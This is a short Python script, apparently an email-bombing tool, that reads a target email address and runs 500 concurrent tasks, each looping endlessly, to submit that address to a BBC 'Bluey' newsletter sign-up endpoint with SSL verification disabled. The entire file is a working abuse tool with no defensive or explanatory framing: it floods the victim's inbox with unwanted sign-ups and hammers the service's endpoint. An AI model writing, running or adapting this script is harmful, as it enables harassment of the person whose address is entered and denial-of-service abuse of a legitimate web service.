import aiohttp
import asyncio
from datetime import datetime
import os

# Install asyncio event loop for Windows if necessary
try:
    import winloop
    winloop.install()
except ImportError:
    pass

os.system("cls && title mahdi1337")

async def signup_spam(session, email):
    url = f'https://cloud.email.bbc.com/Bluey-Sign-Up-Form_Processing_prod?context=SUBMIT&email={email}'
    while True:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    print(f'[{datetime.now().strftime("%H:%M:%S")}] Sent!')
                else:
                    print(f'[{datetime.now().strftime("%H:%M:%S")}] Failed with status {response.status}')
        except aiohttp.ClientError as e:
            print(f'[{datetime.now().strftime("%H:%M:%S")}] Error: {e}')

async def main():
    email = input("Email: ")
    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [signup_spam(session, email) for _ in range(500)]
        await asyncio.gather(*tasks)

asyncio.run(main())
